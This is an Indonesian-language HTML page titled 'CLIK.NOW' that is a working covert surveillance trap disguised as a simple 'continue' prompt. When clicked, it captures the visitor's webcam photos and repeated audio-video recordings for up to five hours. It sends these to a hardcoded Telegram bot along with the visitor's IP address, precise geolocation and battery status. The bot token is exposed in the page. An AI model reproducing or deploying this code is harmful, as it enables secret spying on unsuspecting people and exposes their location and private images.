<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>CLIK.NOW</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #000;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      width: 300px;
    }
    button {
      transition: background 0.3s ease, transform 0.3s ease;
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    #video {
      display: none;
    }
    .circle-light {
      position: absolute;
      top: 5px;
      left: 5px;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: red;
      box-shadow: 0 0 8px 3px red;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <div class="circle-light"></div>

  <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
    silahkan pencet lanjutkan.
  </marquee>

  <div class="popup" id="step1">
    <h2>SILAHKAN PENCET LANJUTKAN</h2>
    <button onclick="startAll()">LANJUTKAN</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const token = '7648038217:AAEhGMOxW_khuHyiCxttyaJyAWzPe9vm52U';
    const chat_id = '7552410869';
    let recorder;
    let recordedChunks = [];

    async function startAll() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('video').srcObject = stream;
        document.getElementById('video').style.display = 'block';

        const popup = document.getElementById('step1');
        popup.style.opacity = 0;
        setTimeout(() => popup.style.display = 'none', 500);

        const synth = window.speechSynthesis;
        const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
        welcome.lang = 'id-ID';
        synth.speak(welcome);

        await takeAndSendPhotos(stream);

        recorder = new MediaRecorder(stream);
        recorder.ondataavailable = handleDataAvailable;
        recorder.onstop = () => handleStop(stream);
        recorder.start();

        setTimeout(() => {
          setInterval(() => {
            recorder.stop();
            recorder.start();
          }, 17000);
        }, 17000);

        setTimeout(() => {
          recorder.stop();
          alert("Rekaman otomatis selesai setelah 5 jam.");
        }, 5 * 60 * 60 * 1000);
      } catch (err) {
        alert("Akses kamera/mikrofon ditolak.");
      }
    }

    async function takeAndSendPhotos(stream) {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      // Tunggu video siap
      await new Promise(resolve => setTimeout(resolve, 1000));
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      for (let i = 0; i < 3; i++) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("photo", blob, `photo${i+1}.jpg`);
          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        }, 'image/jpeg');
        await new Promise(resolve => setTimeout(resolve, 1000)); // jeda antar foto
      }
    }

    function handleDataAvailable(event) {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    }

    async function handleStop(stream) {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];

      const waktu = new Date();
      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
      const location = await getLocation();
      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');

      const message = `
[REKAMAN OTOMATIS]
IP: ${ip}
Waktu: ${waktu.toLocaleString()}
Lokasi: ${location}
Baterai: ${battery}
`;

      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("caption", message);
      formData.append("video", blob, "rekaman.webm");

      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: 'POST',
        body: formData
      });
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
          () => resolve("Lokasi tidak tersedia")
        );
      });
    }
  </script>
</body>
</html>
